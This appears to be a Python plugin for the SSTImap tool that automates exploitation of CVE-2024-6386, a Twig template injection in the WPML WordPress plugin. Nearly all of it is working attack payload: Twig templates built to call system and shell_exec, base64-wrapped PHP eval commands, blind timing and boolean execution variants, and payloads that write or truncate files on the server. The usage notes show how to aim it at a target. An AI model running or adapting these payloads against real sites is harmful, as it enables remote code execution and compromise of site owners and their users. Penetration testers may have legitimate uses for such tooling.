from plugins.languages import php
from core import bash
from utils import rand


class CVE_2024_6386(php.Php):
    extra_plugin = True
    priority = 6
    header_type = 'add'
    sstimap_version = '1.2.3'
    plugin_info = {
        "Description": """WPML Multilingual CMS < 4.6.13 Contributor+ RCE via Twig SSTI""",
        "Usage notes": """WPML Multilingual CMS Plugin for WordPress before 4.6.13 was vulnerable to SSTI in Twig.
Plugin automates detection and exploitation of CVE-2024-6386 providing post-exploitation capabilities.
Correctly set headers X-WP-Nonce and Content-Type as well as cookies are required for exploitation. Example:
./sstimap.py -i -e CVE_2024_6386 --data-type json -m POST -H "Content-Type: application/json" -H "X-WP-Nonce: ..." \
-H "Cookie: ..." -d '{"id":...,"content":"*"}' -u "http://localhost/index.php?rest_route=%2Fwp%2Fv2%2Fpages%2F..." --run""",
        "Authors": [
            "Matthew Rollings @stealthcopter https://github.com/stealthcopter/",  # Vulnerability discovery
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",  # Plugin for SSTImap
            "Emilio @epinna https://github.com/epinna",  # Original Tplmap payload for old versions of Twig
        ],
        "References": [
            "CVE-2024-6386: https://nvd.nist.gov/vuln/detail/CVE-2024-6386",
            "Writeup: https://sec.stealthcopter.com/wpml-rce-via-twig-ssti/",
        ]
    }
    def init(self):
        # WPML Multilingual CMS Plugin for WordPress before 4.6.13 was vulnerable to SSTI in Twig
        # CVE by https://github.com/stealthcopter/
        self.update_actions({
            'render': {
                'render': '{code}',
                # Disable errors, so that "system" will not corrupt the output with a warning
                # source(_self) offset after header is 155+header_len(21)
                'header': ('<!-- wp:shortcode -->'
                           '[wpml_language_switcher]'
                           '{{#error_reportingini_set#}}'
                           '{{% set er = source(_self)|slice(2,15) %}}'
                           '{{% set is = source(_self)|slice(17,7) %}}'
                           '{{% for a in [er, 0]|sort(is) %}}{{% endfor %}}'
                           '{{{{{header[0]}+{header[1]}}}}}'),
                'trailer': '{{{{{trailer[0]}+{trailer[1]}}}}}'
                           '[/wpml_language_switcher]<!-- /wp:shortcode -->',
                'test_render': f'{{#0{rand.randstrings[0]}\n#}}'
                               f'{{% set z = source(_self)|slice(176,1) %}}'
                               f'{{% set rs = source(_self)|slice(177,{1+len(rand.randstrings[0])}) %}}'
                               f'{{{{(1..3)|join(z)}}}}'
                               f'{{{{rs|nl2br}}}}',
                'test_render_expected': f'10203{rand.randstrings[0]}<br \\/>\\n'
            },
            'render_error': {
                'render': '{code}',
                'header': ('<!-- wp:shortcode -->'
                           '[wpml_language_switcher]'
                           '{{% set h = {header[0]}+{header[1]} %}}'),
                # Body needs to set b as the output
                'trailer': '{{% set t = {trailer[0]}+{trailer[1]} %}}'
                           '{{{{[0]|map([h,b,t]|join)}}}}'
                           '[/wpml_language_switcher]<!-- /wp:shortcode -->',
                'test_render': f'{{#0{rand.randstrings[0]}\n#}}'
                               f'{{% set z = source(_self)|slice(37,1) %}}'
                               f'{{% set rs = source(_self)|slice(38,{1+len(rand.randstrings[0])}) %}}'
                               f'{{% set a = (1..3)|join(z) %}}'
                               f'{{% set b = [a, rs|nl2br]|join() %}}',
                'test_render_expected': f'10203{rand.randstrings[0]}<br \\/>\\n'
            },
            # Hackish way to evaluate PHP code
            'evaluate': {
                'call': 'execute',
                'evaluate': """php -r '$d="{code_b64}";eval(base64_decode(str_pad(strtr($d,"-_","+/"),strlen($d)%4,"=",STR_PAD_RIGHT)));'""",
                'test_os': 'echo PHP_OS;',
                'test_os_expected': r'^[\w-]+$'
            },
            'evaluate_boolean': {
                'call': 'execute_blind',
                'evaluate_blind': """php -r '$d="{code_b64}";1 / (true && eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ");"));'""",
            },
            'evaluate_blind': {
                'call': 'execute',
                'evaluate_blind': """php -r '$d="{code_b64}";eval("return (" . base64_decode(str_pad(strtr($d, "-_", "+/"), strlen($d)%4,"=",STR_PAD_RIGHT)) . ") && sleep({delay});");'"""
            },
            'execute': {
                'call': 'render',
                'execute': "{{#0systembase64_decode{code_b64p}#}}"
                           "{{% set z = source(_self)|slice(176,1) %}}"
                           "{{% set s = source(_self)|slice(177,6) %}}"
                           "{{% set b = source(_self)|slice(183,13) %}}"
                           "{{% set p = [source(_self)|slice(196,{lens[clen64p]})]|map(b)[0] %}}"
                           "{{% for a in [p]|map(s) %}}"
                           "{{% endfor %}}",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_error': {
                'call': 'render',
                'execute': "{{#0shell_execcall_user_funcbase64_decode{code_b64p}#}}"
                           "{{% set z = source(_self)|slice(37,1) %}}"
                           "{{% set s = source(_self)|slice(38,10) %}}"
                           "{{% set c = source(_self)|slice(48,14) %}}"
                           "{{% set bp = source(_self)|slice(62,13) %}}"
                           "{{% set p = [source(_self)|slice(75,{lens[clen64p]})]|map(bp)[0] %}}"
                           "{{% set b = {{(p):s}}|map(c)|join %}}",
                'test_cmd': bash.os_print.format(s1=rand.randstrings[2]),
                'test_cmd_expected': rand.randstrings[2]
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': "<!-- wp:shortcode -->"
                                 "[wpml_language_switcher]"
                                 "{{#shell_execcall_user_funcbase64_decode{code_b64p}JiYgecho SSTIMAP\n#}}"
                                 "{{% set s = source(_self)|slice(2,10) %}}"
                                 "{{% set c = source(_self)|slice(12,14) %}}"
                                 "{{% set b = source(_self)|slice(26,13) %}}"
                                 "{{% set p = [source(_self)|slice(39,{lens[clen64p]})]|map(b)[0] %}}"
                                 "{{% set g = [source(_self)|slice(39+{lens[clen64p]}, 4)]|map(b)[0] %}}"
                                 "{{% set t = source(_self)|slice(43+{lens[clen64p]}, 12) %}}"
                                 "{{% set n = source(_self)|slice(55+{lens[clen64p]}, 1) %}}"
                                 "{{% set r = source(_self)|slice(48+{lens[clen64p]}, 7) %}}"
                                 "{{% set pt = p~g~t %}}"
                                 "{{% set bb = 1 / ({{(pt):s}}|map(c)|join|trim(n) ends with r) %}}"
                                 "[/wpml_language_switcher]"
                                 "<!-- /wp:shortcode -->"
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': "<!-- wp:shortcode -->"
                                 "[wpml_language_switcher]"
                                 "{{#systembase64_decode{code_b64p}JiYgsleep {delay}#}}"
                                 "{{% set s = source(_self)|slice(2,6) %}}"
                                 "{{% set b = source(_self)|slice(8,13) %}}"
                                 "{{% set p = [source(_self)|slice(21,{lens[clen64p]})]|map(b)[0] %}}"
                                 "{{% set g = [source(_self)|slice(21+{lens[clen64p]},4)]|map(b)[0] %}}"
                                 "{{% set t = source(_self)|slice(25+{lens[clen64p]}, 6+{lens[delay]}) %}}"
                                 "{{% set pt = p~g~t %}}"
                                 "{{% for a in [pt]|map(s) %}}"
                                 "{{% endfor %}}"
                                 "[/wpml_language_switcher]"
                                 "<!-- /wp:shortcode -->"
            },
            'write': {
                'call': 'inject',
                'write': "<!-- wp:shortcode -->"
                         "[wpml_language_switcher]"
                         "{{#systembase64_decode{chunk_b64p}|base64 -d >> {path}#}}"
                         "{{% set s = source(_self)|slice(2,6) %}}"
                         "{{% set b = source(_self)|slice(8,13) %}}"
                         "{{% set p = [source(_self)|slice(21,{lens[clen64p]})]|map(b)[0] %}}"
                         "{{% set f = source(_self)|slice(21+{lens[clen64p]}, 14+{lens[path]}) %}}"
                         "{{% set pf = p~f %}}"
                         "{{% for a in [pf]|map(s) %}}"
                         "{{% endfor %}}"
                         "[/wpml_language_switcher]"
                         "<!-- /wp:shortcode -->",
                'truncate': "<!-- wp:shortcode -->"
                            "[wpml_language_switcher]"
                            "{{#systemecho -n > {path}#}}"
                            "{{% set s = source(_self)|slice(2,6) %}}"
                            "{{% set p = source(_self)|slice(8,10+{lens[path]}) %}}"
                            "{{% for a in [p]|map(s) %}}"
                            "{{% endfor %}}"
                            "[/wpml_language_switcher]"
                            "<!-- /wp:shortcode -->"
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0}
        ])
